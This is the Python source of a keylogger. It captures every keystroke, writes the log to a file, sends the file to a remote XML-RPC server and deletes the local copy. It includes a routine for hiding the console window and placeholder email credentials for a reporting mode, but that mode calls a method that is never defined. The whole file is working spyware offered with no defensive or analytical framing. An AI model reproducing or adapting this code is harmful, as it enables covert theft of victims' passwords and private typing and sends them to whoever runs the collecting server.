from email.mime import message
import xmlrpc.client, os

URL = "http://localhost:14880"

server = xmlrpc.client.ServerProxy(URL)

def check_connection(server):
    return True if server.arbeiten() else False

def send_file(path : str):
    message : str = ""
    with open(path, "r") as file: message = file.read()
    if server.new(message):
        os.remove(path)
        ...

def hideConsole():
    try:
        import win32gui, win32con
        frgrnd_wndw = win32gui.GetForegroundWindow()
        wndw_title  = win32gui.GetWindowText(frgrnd_wndw)
        win32gui.ShowWindow(frgrnd_wndw, win32con.SW_HIDE)
    except: exit(1)

#hideConsole()

import keyboard 

from threading import Timer
from datetime import datetime
SEND_REPORT_EVERY = 30
EMAIL_ADDRESS = "put_real_address_here@gmail.com"
EMAIL_PASSWORD = "put_real_pw"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        
        self.interval = interval
        self.report_method = report_method

        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):

        name = event.name
        if len(name) > 1:

            if name == "space":

                name = " "
            elif name == "enter":

                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:

                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def update_filename(self):

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):

        with open("1.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        send_file("1.txt")


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
